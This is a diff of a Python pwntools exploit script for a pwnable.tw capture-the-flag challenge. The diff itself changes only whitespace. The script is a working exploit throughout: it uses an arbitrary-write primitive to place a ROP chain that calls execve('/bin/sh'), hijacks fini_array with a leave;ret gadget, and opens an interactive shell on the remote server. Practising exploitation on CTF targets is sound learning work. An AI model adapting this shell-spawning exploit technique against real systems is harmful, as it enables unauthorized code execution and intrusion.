@@ -2,7 +2,7 @@ from pwn import *
 
 server = remote('chall.pwnable.tw',10105)
 
-def send_data(addr,data):
+def send_data(addr, data):
     server.recvuntil('addr:')
     server.sendline(str(addr))
     server.recvuntil('data:')
@@ -26,12 +26,12 @@ syscall_addr = 0x00000000004022b4 #syscall
 binsh_addr = 0x00000000004b4080
 start_addr = 0x00000000004b4100
 
-send_data(start_addr,p64(pop_rax_addr)+p64(0x3b))
-send_data(start_addr+16,p64(pop_rdi_addr)+p64(binsh_addr))
-send_data(binsh_addr,"/bin/sh\x00")
+send_data(start_addr, p64(pop_rax_addr)+p64(0x3b))
+send_data(start_addr+16, p64(pop_rdi_addr)+p64(binsh_addr))
+send_data(binsh_addr, "/bin/sh\x00")
 
-send_data(start_addr+32,p64(pop_rsi_addr)+p64(0))
-send_data(start_addr+48,p64(pop_rdx_addr)+p64(0))
-send_data(start_addr+64,p64(syscall_addr))
-send_data(fini_array_addr,p64(main_leave_ret_addr))
+send_data(start_addr+32, p64(pop_rsi_addr)+p64(0))
+send_data(start_addr+48, p64(pop_rdx_addr)+p64(0))
+send_data(start_addr+64, p64(syscall_addr))
+send_data(fini_array_addr, p64(main_leave_ret_addr))
 server.interactive()
